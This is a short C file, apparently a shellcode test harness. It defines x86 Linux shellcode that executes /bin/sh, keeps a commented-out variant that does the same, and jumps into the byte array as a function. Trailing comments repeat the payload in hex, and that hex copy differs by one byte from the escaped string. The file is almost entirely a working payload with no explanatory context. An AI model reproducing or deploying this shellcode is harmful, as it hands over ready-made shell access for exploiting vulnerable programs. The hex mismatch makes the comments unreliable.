#include <stdio.h>

// char shellcode[] = "\xeb\x1c\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";
char shellcode[] = "\x6a\x68\x68\x2f\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80";

int main(int argc , char *argv()){
    void (*shell)() = (void*) shellcode;
    shell();
    return 0;
}


// 6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
// \x6a\x68\x68\x2f\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80